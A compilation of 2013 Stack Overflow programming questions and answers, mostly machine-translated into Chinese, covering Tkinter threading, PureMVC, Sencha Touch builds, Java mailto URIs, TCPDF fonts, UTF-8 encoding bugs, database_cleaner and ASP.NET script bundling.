> 时间：2013-01-17T14:49:14.743

当需要此功能时，您所做的就是安排您希望执行的事件，方法是将它们放入线程共享的队列中。这样，在给定线程中，您指定要通过排队来运行“create(50, ...)”，然后主线程将事件出列并执行它。

这是在第二个线程中创建移动球的基本示例：

```
import threading
import Queue
import random
import math
import time
import Tkinter

random.seed(0)

class App:
    def __init__(self, queue, width=400, height=300):
        self.width, self.height = width, height
        self.canvas = Tkinter.Canvas(width=width, height=height, bg='black')
        self.canvas.pack(fill='none', expand=False)
        self._oid = []
        self.canvas.after(10, self.move)

        self.queue = queue
        self.canvas.after(50, self.check_queue)

    def check_queue(self):
        try:
            x, y, rad, outline = self.queue.get(block=False)
        except Queue.Empty:
            pass
        else:
            self.create_moving_ball(x, y, rad, outline)
        self.canvas.after(50, self.check_queue)

    def move(self):
        width, height = self.width, self.height
        for i, (oid, r, angle, speed, (x, y)) in enumerate(self._oid):
            sx, sy = speed
            dx = sx * math.cos(angle)
            dy = sy * math.sin(angle)
            if y + dy + r> height or y + dy - r < 0:
                sy = -sy
                self._oid[i][3] = (sx, sy)
            if x + dx + r > width or x + dx - r < 0:
                sx = -sx
                self._oid[i][3] = (sx, sy)
            nx, ny = x + dx, y + dy
            self._oid[i][-1] = (nx, ny)
            self.canvas.move(oid, dx, dy)
        self.canvas.update_idletasks()
        self.canvas.after(10, self.move)

    def create_moving_ball(self, x=100, y=100, rad=20, outline='white'):
        oid = self.canvas.create_oval(x - rad, y - rad, x + rad, y + rad,
                outline=outline)
        oid_angle = math.radians(random.randint(1, 360))
        oid_speed = random.randint(2, 5)
        self._oid.append([oid, rad, oid_angle, (oid_speed, oid_speed), (x, y)])

def queue_create(queue, running):
    while running:
        if random.random() < 1e-6:
            print "Create a new moving ball please"
            x, y = random.randint(100, 150), random.randint(100, 150)
            color = random.choice(['green', 'white', 'yellow', 'blue'])
            queue.put((x, y, random.randint(10, 30), color))
        time.sleep(0) # Effectively yield this thread.

root = Tkinter.Tk()
running = [True]

queue = Queue.Queue()

app = App(queue)
app.create_moving_ball()
app.canvas.bind('<Destroy>', lambda x: (running.pop(), x.widget.destroy()))

thread = threading.Thread(target=queue_create, args=(queue, running))
thread.start()

root.mainloop() 
```

# apache-flex - Flex PureMVC：代理可以在以下情况下保留视图组件的引用吗？

> ID：14379108
> 
> 赞同：0
> 
> 时间：2013-01-17T12:27:15.503
> 
> 标签：apache-flex, dynamic, views, puremvc

我正在学习 pureMVC 并尝试将框架实现到我的一个应用程序中。我有以下案例：

我的主应用程序有 Canvas，用于添加不同类型的自定义组件。自定义组件之一是“搜索组件”（在页面上创建多个实例）。我的搜索组件有一个文本文件和一个搜索按钮，并按以下步骤启动搜索：

1-单击搜索按钮调度一个自定义事件，该自定义事件将搜索组件的引用作为一个属性。

2-My AppMediator 监听自定义事件并获取当前搜索组件的引用以及搜索文本。

3-Mediator 发送通知（sentNotification(AppConstants.SEARCH_CLICKED, component)）。

4-我已经注册了一个带有 SEARCH_CLICKED 通知的命令。

5-命令检索 WebserviceProxy 并调用其 Search(text) 方法。

6-WebserviceProxy 与远程 Web 服务对话并使用 asyncToken 获取结果。

**我的问题是：** 我的命令在开始搜索时引用了自定义搜索组件，但搜索网络服务需要一些时间才能得到结果。我如何将结果处理回启动搜索的自定义搜索组件。因为我有多个搜索组件实例。保留该组件引用的最佳位置是什么，我应该在 WebserviceProxy 中添加一个变量以保留该引用并将结果交给它，还是我必须创建一个全局代理来保留此类组件的引用？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-24T15:42:31.500

我已经使用 PureMVC 几年了，我喜欢它！

我想你还没有理解主要组件的角色和协作。

1.  您不应该在命令和 UI 元素之间有任何依赖关系。您的 Mediator 必须从您的 UI 组件中获取具体值并通过 Notification 发送它。在这种情况下，命令和代理将只获得一个文本值，不管它的来源是什么！假设您将在一段时间后更改您的 UI，并且您将在用户端使用另一个组件来确定搜索值。在您的情况下，您将不得不更改代理和命令。这会很糟糕。

2.  代理可能没有关于命令和中介的任何信息。它只能提供让其他组件与之交互的功能，并且在获得新信息后发送带有新信息的通知，而不知道谁对它感兴趣。

再次阅读框架的描述并写下你的问题。我在理解这些东西方面也遇到了一些问题，我看到了你的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T07:58:01.813

根据安东的回答，我重新思考并尝试分离依赖。因此，我尝试通过向 Mediator 的构造函数提供不同的 ID 来分别使用“SearchMediator”来调解 Search Widget 的每个实例。现在，当搜索小部件启动新搜索时，它的中介调用命令，命令调用代理的方法进行实际搜索并从数据库中获取结果并发送通知。SearchMediator 会处理该通知并将结果移交给适当的 UI。

# javascript - Sencha Touch：应用程序名称中的 Unicode 字符（构建器的配置 json 文件）

> ID：14379113
> 
> 赞同：0
> 
> 时间：2013-01-17T12:27:37.530
> 
> 标签：javascript, json, sencha-touch, sencha-touch-2

如何在 json 文件中正确设置 unicode 字符串来构建 sencha touch 应用程序？

这个[假设](http://www.sencha.com/forum/showthread.php?254051-Non-english-characters-in-applicationName-for-Android-native&p=929915)可能是错误的，它不会为任何变体编译： **"\u0423\u0413\u041F"**和 **"%u0423%u0413%u041F"**。如果我使用拉丁字符（“UGP”），那么它会正常构建。

编译器日志：

```
 c:\all\trunk\mobile\UGP>sencha --debug package build config.json
Sencha Cmd v3.0.0.250
[DBG]           using path C:\Sencha\Cmd\3.0.0.250\stbuild;C:\Sencha\Cmd\3.0.0.2
50\stbuild\bin;C:\Program Files\pkzip;C:\Users\sergzach\Desktop\adt-bundle-windo
ws-x86\adt-bundle-windows-x86\sdk\platform-tools;C:\Program Files\Java\jdk1.7.0_
09\bin;C:\Sencha\Cmd\3.0.0.250;C:\SenchaSDKTools-2.0.0-beta3;C:\SenchaSDKTools-2
.0.0-beta3\bin;C:\SenchaSDKTools-2.0.0-beta3\compat\jsbuilder;C:\SenchaSDKTools-
2.0.0-beta3\compat\scripts;C:\Users\sergzach\Desktop\adt-bundle-windows-x86\adt-
bundle-windows-x86\sdk\tools;C:\all\sencha-projects;C:\Program Files\AMD APP\bin
\x86;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32
\WindowsPowerShell\v1.0\;C:\Program Files\ATI Technologies\ATI.ACE\Core-Static;C
:\Program Files\TortoiseSVN\bin;C:\Program Files\PostgreSQL\8.4\bin\;C:\Python26
\Scripts;C:\Python26;C:\Program Files\ImageMagick-6.6.7-Q16;C:\all\start;C:\all\
trunk\www\cometd\cometd-twisted;C:\Program Files\nodejs\;C:\Users\sergzach\AppDa
ta\Roaming\npm\
[DBG]           executable located at C:\Sencha\Cmd\3.0.0.250\stbuild\stbuild.ex
e
[DBG]           using workding directory .
Error: Project name '╨г╨У╨Я' contains invalid characters.
Allowed characters are: a-z A-Z 0-9 _
""C:/Users/sergzach/Desktop/adt-bundle-windows-x86/adt-bundle-windows-x86/sdk\to
ols\android" create project --target android-10 --name ╨г╨У╨Я --activity STActiv
ity --path "C:/all/trunk/mobile/UGP-out\/" --package com.ergosolo.firstApp"
Can not open destination file for writing
Failed to copy packager library
Failed to package application
Copy operation failed src=C:\Sencha\Cmd\3.0.0.250\stbuild\st-res/android/\nimble
kit.jar dst=C:/all/trunk/mobile/UGP-out\\libs\nimblekit.jar
[DBG]           exit code was : 3
[DBG]           exit code was : 3
[ERR]
Error: Project name '??????' contains invalid characters.
Allowed characters are: a-z A-Z 0-9 _
""C:/Users/sergzach/Desktop/adt-bundle-windows-x86/adt-bundle-windows-x86/sdk\to
ols\android" create project --target android-10 --name ?????? --activity STActiv
ity --path "C:/all/trunk/mobile/UGP-out\/" --package com.ergosolo.firstApp"
Can not open destination file for writing
Failed to copy packager library
Failed to package application
Copy operation failed src=C:\Sencha\Cmd\3.0.0.250\stbuild\st-res/android/\nimble
kit.jar dst=C:/all/trunk/mobile/UGP-out\\libs\nimblekit.jar

[ERR]           stbuild exited with non-zero code : 3

com.sencha.exceptions.ExProcess: stbuild exited with non-zero code : 3
        at com.sencha.command.pkg.PackageCommands$BasePackageCommand.execute(Pac
kageCommands.java:49)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at com.sencha.cli.Command.dispatch(Command.java:78)
        at com.sencha.cli.Commands.dispatch(Commands.java:49)
        at com.sencha.cli.Commands.dispatch(Commands.java:49)
        at com.sencha.command.Sencha.main(Sencha.java:71) 
```

完整的**config.json**：

```
{
/**
 * @cfg {String} applicationName
 * @required
 * This is the name of your application, which is displayed on the device when the app is installed. On IOS, this should match
 * the name of your application in the Apple Provisioning Portal.
 */
"applicationName":"\u0423\u0413\u041F",

"iconName": "C:/all/trunk/mobile/UGP/resources/icons/Icon.png",

/**
 * @cfg {String} applicationId
 * This is the name namespace for your application. On IOS, this should match the name of your application in the Apple Provisioning Portal.
 */
"applicationId":"com.ergosolo.firstApp",

/**
 * @cfg {String} bundleSeedId
 * A ten character string which stands before aplication ID in Apple Provisioning Portal
 */
"bundleSeedId":"KPXFEPZ6EF",

/**
 * @cfg {String} versionString
 * @required
 * This is the version of your application.
 */
"versionString":"1.0",

/**
 * @cfg {Integer} versionCode
 * @required
 * This is the integer version code of your application, or you can refer to it as a build number. Used only for Android builds.
 */
"versionCode":"1",

/**
 * @cfg {Object} icon
 * For iOS, please refer to their documentation about icon sizes:
 * https://developer.apple.com/library/ios/#documentation/userexperience/conceptual/mobilehig/IconsImages/IconsImages.html
 *
 * For Android, please refer to the Google Launcher icons guide:
 * http://developer.android.com/guide/practices/ui_guidelines/icon_design_launcher.html
 */
"icon": {
    "57":"resources/icons/Icon.png",
    "72":"resources/icons/Icon~ipad.png",
    "114":"resources/icons/Icon@2x.png",
    "144":"resources/icons/Icon~ipad@2x.png"
},

/**
 * @cfg {String} inputPath
 * @required
 * This is location of your Sencha Touch 2 application, relative to this configuration file.
 */
"inputPath":"C:/all/trunk/mobile/UGP",

/**
 * @cfg {String} outputPath
 * @required
 * This is where the built application file with be saved. Make sure that output path is not in your input path, you may get into endless recursive copying
 */
"outputPath":"C:/all/trunk/mobile/UGP-out",

/**
 * @cfg {String} configuration
 * @required
 * This is configuration for your application. `Debug` should always be used unless you are submitting your app to an online
 * store - in which case `Release` should be specified.
 */
"configuration":"Debug",

/**
 * @cfg {String} platform
 * @required
 * This is the platform where you will be running your application. Available options are:
 *  - iOSSimulator
 *  - iOS
 *  - Android
 *  - AndroidEmulator
 */
"platform":"AndroidEmulator",

/**
 * @cfg {String} deviceType
 * @required
 * This is device type that your application will be running on.
 *
 * If you are developing for Android, this is not necessary.
 *
 * Available options are:
 *  - iPhone
 *  - iPad
 *  - Universal
 */
"deviceType":"Universal",

/**
 * @cfg {String} certificatePath
 * This is the location of your certificate.
 * This is required when you are developing for Android or you are developing on Windows.
 */
"certificatePath":"C:/all/GS/my-debug-key.keystore",

/**
 * @cfg {String} certificateAlias
 * This is the name of your certificate.
 *
 * IF you do not specify this on OSX, we will try and automatically find the certificate for you using the applicationId.
 *
 * This can be just a simple matcher. For example, if your certificate name is "iPhone Developer: Robert Dougan (ABCDEFGHIJ)", you
 * can just put "iPhone Developer".
 *
 * When using a certificatePath on Windows, you do not need to specify this.
 */
"certificatePassword":"",
/**
 * @cfg {String} certificatePassword
 * The password which was specified during certificate export
 */
"provisionProfile":"",
/**
 * @cfg {String} provisionProfile
 * The path to the provision profile (APP_NAME.mobileprovision) which you can create and then download from Apple's provisioning portal
 */
"sdkPath":"C:/Users/sergzach/Desktop/adt-bundle-windows-x86/adt-bundle-windows-x86/sdk",

/**
 * @cfg {String} sdkPath
 * This is the path to the Android SDK, if you are developing an Android application.
 */

/**
/**
 * @cfg {String} androidAPILevel
 * This is android API level, the version of Android SDK to use, you can read more about it here: http://developer.android.com/guide/appendix/api-levels.html.
 * Be sure to install corresponding platform API in android SDK manager (android_sdk/tools/android)
 */
"androidAPILevel":"10",

/**
/**
 * @cfg {Array[String]} permissions
 * Array of permissions that is used by an application (Android only) 
 * Full list of permissions for Android application can be found here: http://developer.android.com/reference/android/Manifest.permission.html#ACCESS_CHECKIN_PROPERTIES
 */
"permissions":["android.permission.INTERNET"],

/**
 * @cfg {Array[String]} orientations
 * @required
 * This is orientations that this application can run.
 */
"orientations": [
    "portrait",
    "landscapeLeft",
    "landscapeRight",
    "portraitUpsideDown"
] 
```

}

# java - 添加到，抄送，Desktop.mail(uri) 中的主题

> ID：14379116
> 
> 赞同：0
> 
> 时间：2013-01-17T12:27:44.653
> 
> 标签：java, email

我是使用 Desktop.mail(URI) 类的初学者，所以我正在寻找一种在程序触发时添加到、抄送和主题的方法。

```
 String mailTo = "test@domain.com";
     String cc = "test2@domain.com";
     String subject = "firstEmail";
     String body = "the java message";

    URI uriMailTo = new URI(mailTo,cc,subject,body);
    Desktop desktop;
    desktop = Desktop.getDesktop();
    desktop.mail(uriMailTo); 
```

任何人都可以建议任何教程来学习这个过程，因为我正在寻找更多的功能，比如将数据从 Outlook 接收回 Java 程序。

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:41:29.877

[Desktop.mail()](http://docs.oracle.com/javase/6/docs/api/java/awt/Desktop.html#mail%28java.net.URI%29)函数是一种实用方法，用于启动用户系统中可能存在的任何邮件程序（如果有）。您控制要（最终）发送的实际邮件消息的能力（非常）有限，一旦显示邮件客户端，您就已经完成了 - 也就是您不会得到任何关于实际发送的消息的反馈或是否发送成功了。

如果您需要这种级别的控制，那么您应该使用[JavaMail API](http://docs.oracle.com/javaee/6/api/javax/mail/internet/package-summary.html)，它可以满足您的许多需求。

如果您坚持使用桌面邮件客户端，那么您可能需要阅读[RFC 2368](http://www.ietf.org/rfc/rfc2368.txt)。它描述了可以包含在`mailto`URI 中的所有字段。因此，您将能够填充消息，但您不会收到关于它是否成功发送的反馈：

```
mailto:joe@example.com?cc=bob@example.com&body=hello+world 
```

构建 URI 的代码示例（顺便说一句，这是不正确的）：

```
final String mailURIStr = String.format("mailto:%s?subject=%s&cc=%s&body=%s",
    mailTo, subject, cc, body);
final URI mailURI = new URI(mailURIStr); 
```

如有必要，替换的地方应进行 URL 编码。

# html - 根据框架集中的第二个框架滚动整个窗口

> ID：14379117
> 
> 赞同：0
> 
> 时间：2013-01-17T12:27:45.527
> 
> 标签：html, css, frameset

我有两个框架的框架。
第一个是固定高度，第二个可以有不同的高度。

我如何实现根据第二帧滚动整个窗口的解决方案，因此当有人向下滚动第二帧时第一帧会隐藏。

代码是一个基本的框架集

```
 <frameset rows="5%,95%">
       <frame src="/bar.html" scrolling=no >
       <frame name=myfr id="myframe" src="http://example.com">
    </frameset> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T14:48:27.677

这就是框架和框架集的样子，您使用框架集有什么原因吗？

# php - 如何在 PHP 中生成多语言内容 Pdf

> ID：14379119
> 
> 赞同：5
> 
> 时间：2013-01-17T12:28:00.317
> 
> 标签：php, pdf, internationalization, tcpdf

我正在使用 TCPDF 在 PHP 中生成多语言内容 PDF。我正在使用 TCPDF 并使用字体“cid0jp”，但它迫使用户下载 adobe 阅读器的语言包。

有没有办法在不强制用户下载任何语言包的情况下生成多语言 pdf？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-22T10:06:10.370

是的，有办法。我只是有同样的问题。为什么 Adob​​e Reader 要求提供我不知道的语言包。

但我知道创建多语言 PDF 的最佳方法是使用`Arial Unicode MS`Windows 中包含的 -Font。根据维基百科，这是字符最多的字体！**但是**没有粗体或斜体。[您可以从http://www.linotype.com/en/817674/ArialUnicode-family.html#](http://www.linotype.com/en/817674/ArialUnicode-family.html#)购买 Arial Unicode Bold 。

我使用带有中文、日文、西里尔文的 Arial MS Unicode 字体。对于西方语言，我使用正常的 Arial，所以我有斜体和粗体。另一种可能性是为每种语言使用为该语言制作的自己的字体。

要使 Arial MS Unicode 与 tcpdf 一起使用，请按照以下问题的答案进行操作：[使用支持所有语言的 TCPDF 创建 PDF，尤其是 CJK](https://stackoverflow.com/questions/9426983/creating-pdfs-using-tcpdf-that-supports-all-languages-especially-cjk)

我希望我能帮助...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-26T05:04:02.277

将 html2pdf 用于多语言。
我试过这个，它对我有用。我为（英语/日语）开发了多语言使用字体 arialunicid0 的网站。

```
require_once('Classes/library/html2pdf.class.php');   
    //$html2pdf = new HTML2PDF('P', 'A4', 'en');
    $html2pdf = new HTML2PDF('P', 'A4', 'en', true, 'UTF-8');       
    $html2pdf->setDefaultFont('arialunicid0');       
    $html2pdf->pdf->SetDisplayMode('fullpage');
    $html2pdf->writeHTML($content, isset($_GET['vuehtml']));
    $filename = $filename .'_'.date('Ymd');
    $html2pdf->Output($filename.'.pdf','D'); 
```

它下载带有日文文本的文件。
我在这里遇到的唯一问题是文件名。
如果我通过日文字符作为文件名，它会下载具有空白名称的文件。

# php - 将 Facebook 和 Twitter 用户作为网站上的一个用户处理

> ID：14379120
> 
> 赞同：0
> 
> 时间：2013-01-17T12:28:00.643
> 
> 标签：php, mysql, facebook, twitter, oauth-2.0

在我的网站上，我为用户提供了两个登录 FB 和 Twitter 的选项，我成功地从两个 APi 获取了用户信息，现在我想将我的 MySQL 数据库中的 facebook 和 twitter 用户作为一个用户来处理。

例如：如果有人使用他的 FB 个人资料注册，然后如果同一用户使用他的 Twitter 帐户登录，那么我想识别该用户。

有可能吗？有什么办法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:03:14.620

Twitter 和 Facebook 帐户通常没有关联，您无法自动确定它们是否属于同一帐户。即使是电子邮件地址也可能具有误导性。

但这甚至有必要吗？我假设决定通过 Facebook 登录您的网站的用户将始终使用 Facebook。当他们决定改用他们的 Twitter 登录名时，他们会*期望*拥有一个单独的帐户。

您可以让用户能够“链接”他们的帐户。当他们通过 Facebook 登录时，提供一个按钮“添加 Twitter 帐户”，反之亦然。然后，您可以确定该人拥有这两个帐户。当用户有多个 Facebook 或 Twitter 帐户时，这甚至可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:10:29.583

有可能，但是您需要在 user 表中有一个 facebook 字段和一个 twitter 字段，并且您需要为用户提供将其现有帐户与他们的 twitter / facebook 帐户相关联的方法（无论他们不是已经在使用）。

就我个人而言，我更倾向于拥有一个既不需要 facebook 也不需要 twitter，但可以同时使用的用户表。我们 Google+ 人员可以使用您的网站而不会受到冒犯。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:34:10.147

如果用户在 facebook 和 twitter 帐户中使用了相同的电子邮件地址，那么如果您使用 oauth 设置来对 facebook 和 twitter 帐户进行肉体访问，那么您可以选择它并比较它们，但这是一种糟糕的做法。

在您自己的应用程序上，您是否要求提供更多信息？如果用户正在输入您已经拥有的数据，您是否可以放置一个分支，然后您询问他们是否是同一个用户？可能通过密码检查？

如果我误解了，你能提供更多信息吗？

玛格丽特

# iphone - MPMoviePlayer shows a solid black screen

> ID：14379122
> 
> 赞同：0
> 
> 时间：2013-01-17T12:28:02.663
> 
> 标签：iphone, objective-c, ios6, media-player

I am currently working on an app in which I need to play a video. Everything is working fine. But if my application is sent to the background and then again to the foreground it shows a solid black screen.

Please provide me with a solution to this problem.

```
 [player.view setFrame:CGRectMake(0, 0, 480, 278)];
    [player.view setAutoresizingMask:UIViewAutoresizingFlexibleWidth];
    outputURL = [NSURL fileURLWithPath:filePath];
    [player setContentURL:outputURL];
    [player setShouldAutoplay:NO];
    player.repeatMode = MPMovieRepeatModeNone;
    player.controlStyle =  MPMovieControlStyleNone ;

    player.scalingMode = MPMovieScalingModeAspectFit;

    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(moviePlayBackDidFinish) name:MPMoviePlayerPlaybackDidFinishNotification object:player];
    [player prepareToPlay];
    [player pause];
    [self.view addSubview: player.view]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:36:55.420

只需查看此解决方案 [对于 MPMoviePlayer](https://stackoverflow.com/questions/13243903/mediaplayer-framework-not-playing-video-in-ios-6/13251798#13251798)

# java - 关闭双引号的未知 UTF-8 代码单元

> ID：14379123
> 
> 赞同：3
> 
> 时间：2013-01-17T12:28:05.610
> 
> 标签：java, xml, utf-8, saxparser

我的问题如下。我正在阅读一个 XML 文件，其文本节点部分包含 UTF-8 版本的打开和关闭双引号。文本被提取，缩短为 3999 字节并放入新的 XML 格式，然后保存为文件。

虽然 Notepad++ 在输入文件中正确显示了这两个符号，但输出文件包含无效的 utf-8 字符，甚至 Notepad++ 也无法显示。

开头的双引号打印正确，但结尾的双引号被毁容。

使用十六进制编辑器，我发现代码单元以某种方式从

> E2 80 9D

在输入文件中

> E2 80 3F

在输出文件中。我正在使用 sax-parser 进行 xml 解析。

是否有任何已知的错误可能导致这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:47:57.560

E2 80 9D 是 UTF-8 的有效字节序列，给出`'”' = \u201d'`. 您可以看到这一点，因为所有高位都已设置。*这是 UTF 值得称赞的安全属性，因此不会错误地在这样的序列中找到 ASCII，例如 '/'。*

在第二个序列中，3F ('?') 在字节中没有设置高位，所以是错误的。这意味着读数出错（问号）左右。就像转换两次，替换。特别是 9D 在扩展的 Windows Latin-1 aka Cp1252 (80 - 9F) 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:50:25.297

不是一个已知的错误，而是在读取或写入文件时忽略编码的常见错误 - 导致使用的平台默认编码在这种情况下为 Windows-1252。

最初读取文件时，应指定 UTF-8 解码，写入新文件时，应指定 UTF-8 编码。如果您发布您的实施，我可以将其纠正到位。

如何重现：

```
byte[] quoteutf8 = {(byte)0xE2, (byte)0x80, (byte)0x9D};
String decodedPlatformDefault = new String(quoteutf8, "Windows-1252");
byte[] encodedPlatformDefault = decodedPlatformDefault.getBytes("Windows-1252");

for( byte i : encodedPlatformDefault ) {
    System.out.print(String.format( "%02x ", i ));
   //e2 80 3f   
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:14:47.280

从字节数组创建新字符串以及从字符串返回字节数组时，您应该始终指定字符集名称。

如果没有，将采用您系统的默认字符集，可能会在任何地方产生问题......

代替

```
new String(myByteArray);
//... and...
myString.getBytes(); 
```

你应该使用

```
new String(myByteArray, "UTF-8");
//... and...
myString.getBytes("UTF-8"); 
```

例如

```
Transformer transformer = TransformerFactory.newInstance().newTransformer();

transformer.setOutputProperty(OutputKeys.ENCODING, "UTF-8");
transformer.setOutputProperty(OutputKeys.INDENT, "yes");

StreamResult result = new StreamResult(new StringWriter());
DOMSource source = new DOMSource(xmlDocument);
transformer.transform(source, result);

return result.getWriter().toString().getBytes("UTF-8"); 
```

从 Java 1.6 开始，您可以[指定一个 Charset](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#String%28byte%5B%5D,%20java.nio.charset.Charset%29)而不是包含 charset 名称的 String：

# ruby-on-rails - database_cleaner without database.yml and multiple databases

> ID：14379126
> 
> 赞同：1
> 
> 时间：2013-01-17T12:28:10.120
> 
> 标签：ruby-on-rails, ruby, cucumber, database-cleaner

I have a cucumber-tests of non-rails application.

I do not have database.yml in my project, and for some reasons dont want to have it (connection setting are stored in a bit different format).

I have several database models, defined like

```
class MyBase < ActiveRecord::Base
  self.abstract_class = true

  def self.some_extra_methods
  end 
end

class DatabaseA < MyBase
  self.abstract_class = true
  establish_connection ($configA)
end

class DatabaseB < MyBase
  self.abstract_class = true
  establish_connection ($configB)
end

# if i will not connect ActiveRecord::Base to something i get ActiveRecord::ConnectionNotEstablished errors 
# is there a better solution?
ActiveRecord::Base.establish_connection $configC;

class TableA < DatabaseA
  self.table_name =  :table_a
  self.primary_key = :id
end
#... and other tables

class TableB < DatabaseB
  self.table_name =  :table_b
  self.primary_key = :id
end
#... and other tables 
```

Now to clean that databases i'm trying to use the following code. I do not have database.yml so i'm just passing models.

```
DatabaseCleaner[:active_record, {:model => DatabaseA} ].strategy = :truncation
DatabaseCleaner[:active_record, {:model => DatabaseB} ].strategy = :truncation

Before do
  DatabaseCleaner.start
end

After do
  DatabaseCleaner.clean
end 
```

But it cleans only database connected by ActiveRecord::Base, not DatabaseA & DatabaseB What is wrong?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-18T06:56:05.647

我认为，这个要点正是您所需要的：[https](https://gist.github.com/1109325) ://gist.github.com/1109325 代码看起来很奇怪，但它确实有效。

# c# - ASP.NET MVC 4 Script bundling causes errors upon deployment

> ID：14379130
> 
> 赞同：20
> 
> 时间：2013-01-17T12:28:26.103
> 
> 标签：c#, javascript, asp.net-mvc-4, bundle, razor-2

My website is working fine on localhost when `@Scripts.Render()` is not bundling the scripts however when I deploy to my server the bundled Javascript must contain an error as all Javascript on my page stops working.

Here is my bundle code:

```
 public static void RegisterBundles(BundleCollection bundles)
        {
            bundles.Add(new ScriptBundle("~/bundles/jquery").Include(
                        "~/Scripts/jquery-{version}.js",
                    "~/Scripts/jquery-migrate-{version}.js"));

            bundles.Add(new ScriptBundle("~/bundles/jqueryval").Include(
                    "~/Scripts/jquery.unobtrusive*",
                    "~/Scripts/jquery.validate*"));

            bundles.Add(new ScriptBundle("~/bundles/jqueryui").Include(
                        "~/Scripts/jquery-ui-{version}.js",
                        "~/Scripts/jquery-ui.unobtrusive-{version}.js"));

            bundles.Add(new ScriptBundle("~/bundles/modernizr").Include(
                        "~/Scripts/modernizr-*"));

            bundles.Add(new StyleBundle("~/Content/css").Include("~/Content/site.css"));

            bundles.Add(new StyleBundle("~/Content/themes/base/css").Include(
                        "~/Content/themes/base/jquery.ui.core.css",
                        "~/Content/themes/base/jquery.ui.resizable.css",
                        "~/Content/themes/base/jquery.ui.selectable.css",
                        "~/Content/themes/base/jquery.ui.accordion.css",
                        "~/Content/themes/base/jquery.ui.autocomplete.css",
                        "~/Content/themes/base/jquery.ui.button.css",
                        "~/Content/themes/base/jquery.ui.dialog.css",
                        "~/Content/themes/base/jquery.ui.slider.css",
                        "~/Content/themes/base/jquery.ui.tabs.css",
                        "~/Content/themes/base/jquery.ui.datepicker.css",
                        "~/Content/themes/base/jquery.ui.progressbar.css",
                        "~/Content/themes/base/jquery.ui.theme.css"));
        } 
```

Here is my rendering code:

```
@Styles.Render("~/Content/css")
@Styles.Render("~/Content/themes/base/css")
@Scripts.Render("~/bundles/jquery")
@Scripts.Render("~/bundles/jqueryval")
@Scripts.Render("~/bundles/jqueryui")
@Scripts.Render("~/bundles/modernizr") 
```

Can someone explain what might be happening to my Javascript upon deployment?

Thanks, Alex.

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-02-22T16:57:30.383

您还可以将“新 ScriptBundle”更改为“新 Bundle”：

```
bundles.Add(new Bundle("~/bundles/modernizr").Include("~/Scripts/modernizr-*")); 
```

这将在不缩小的情况下捆绑您的资产。我遇到了一些情况，缩小只是不适用于某些库，所以这仍然允许你将它们包含在你的包中。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-11-29T10:17:59.617

## 即使出现错误，缩小也“有效”

真正的解决方案是：

*   在发布**之前**排除 .min 和 .map 文件

并且缩小将起作用。事实上，缩小过程总是有效的！

## 如果“它有效”，它到底是怎么回事：为什么我们会出错？

与启用的优化捆绑时，ASP.Net 似乎优先使用 .min 文件。因此，它还将在 .min 文件中集成任何代码，并在不添加换行符的情况下一个接一个地附加每个 javascript 文件。

是**浏览器**无法理解为什么会有潜在的注释 /* 在最小映射配置之后： //# sourceMappingURL=jquery.history.min.js.map 因为捆绑的文件看起来像：

```
[SOMEJAVASCRIPT OF FILEJAVASCRIPT1 HERE;]
//# sourceMappingURL=jquery.history.min.js.map /* begin of a comment of FILEJAVASCRIPT2 appended (in the bundle) javascript file */ 
```

有两种解决方案可以避免该错误：

*   为无法跟随的 javascript 文件创建单独的捆绑包（就像不激活捆绑功能一样）。
*   创建一个不会启用缩小的捆绑包（坏）
*   或替代方案：排除所有缩小文件或具有 sourceMappingURL（或更改其源）和 .map 文件的 min.js 文件

目标是强制 ASP.Net 自己重新生成 min 文件（并且 ASP.Net 不会在其生成的文件中生成 //sourceMappingUrl，因此它将解决该问题）。

所以真正的问题是这个特性在浏览器中的当前实现，因为它似乎无法解析源映射注释的注释。也许还有另一种方式来指示浏览器 sourceMappingUrl 已经结束。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2013-01-17T14:31:42.160

通常调试和部署的包之间的唯一区别是在调试时优化被关闭。

打开优化时，缩小可能会突出显示语法错误，如果有换行符，则可以原谅。例如：

```
var x = 10
var y = 15 
```

未缩小，这可能会起作用 - 但缩小后你最终会得到......

```
var x = 10 var y = 15 // SyntaxError: missing ; before statement 
```

这不起作用 - 你需要`;`那里缺少的字符。

如果您调试脚本，您应该能够看到错误在哪里。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-23T14:20:59.013

检查此解决方案
IIS Config>Authentication>RightClickOn Anonymous Auth>Click Edit> Check Application pool identity

取自[这里](https://stackoverflow.com/a/19544226/984606)。

# c# - What causes the error: Viewstate verification failed. Reason: The viewstate supplied failed integrity check?

> ID：14379133
> 
> 赞同：0
> 
> 时间：2013-01-17T12:28:30.580
> 
> 标签：c#, view, viewstate, state

I'm using a single server to host the application, and between 15h and 00h i had 1200 error of invalid viewstate, what can cause this error? in this specify moment? The Event Viewer do not report anything about, only report the error, any other log explains the reason.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-16T07:06:50.197

